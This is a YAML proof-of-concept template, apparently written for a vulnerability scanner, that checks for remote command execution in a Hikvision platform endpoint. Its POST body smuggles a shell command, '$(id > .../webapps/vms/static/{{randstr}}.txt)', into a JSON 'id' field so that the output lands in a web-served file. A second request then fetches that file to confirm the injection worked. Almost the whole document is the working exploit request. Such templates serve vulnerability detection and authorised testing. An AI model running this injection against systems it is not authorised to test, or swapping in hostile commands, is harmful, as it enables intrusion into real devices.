name: poc-yaml-hikvision-detection-rce
transport: http
  

set:
  randstr: randomLowercase(6)


rules:
  r0:
    request:
      method: POST
      path: /center/api/installation/detection
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
        Content-Type: application/json;charset=UTF-8
      body: '{"type":"environment","operate":"","machines":{"id":  "$(id > /opt/hikvision/web/components/tomcat85linux64.1/webapps/vms/static/{{randstr}}.txt)"}}'
    expression: response.status == 200

  r1:
    request:
      method: GET
      path: /vms/static/{{randstr}}.txt
      headers:
        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
    expression: response.status == 200 && response.body.bcontains(b'uid') && response.body.bcontains(b'gid')


expression: r0() && r1()

detail:
  author: Superhero
  links:
    - https://blog.csdn.net/m0_60571842/article/details/140688459


